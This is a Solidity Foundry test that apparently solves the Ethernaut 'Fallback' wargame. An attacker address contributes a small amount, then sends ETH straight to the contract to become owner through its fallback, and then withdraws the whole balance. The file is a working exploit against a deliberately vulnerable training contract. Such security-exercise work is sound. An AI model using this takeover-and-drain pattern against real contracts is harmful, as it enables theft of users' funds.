// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";

contract FallbackTest is Test {

    Fallback fallbackContract;
    address public constant ATTACKER = address(0xB0B);
    address owner = msg.sender;

    function setUp() public {
        fallbackContract = new Fallback();
        vm.deal(ATTACKER, 1 ether);
    }

    function test_1() public {
        //set
        for (uint i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallbackContract.contribute{value: 0.0009 ether}();
        }
        console.log("Balance Before Attack", address(fallbackContract).balance);
        

        //attack
        vm.startPrank(ATTACKER);
        fallbackContract.contribute{value: 0.0001 ether}();
        payable(address(fallbackContract)).call{value: 0.0001 ether}(""); // by sending eth direct to contract, sender becomes owner
        fallbackContract.withdraw();
        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0);
        assert(ATTACKER == fallbackContract.owner());
        console.log("Balance After Attack", address(ATTACKER).balance);
        
    }        

}
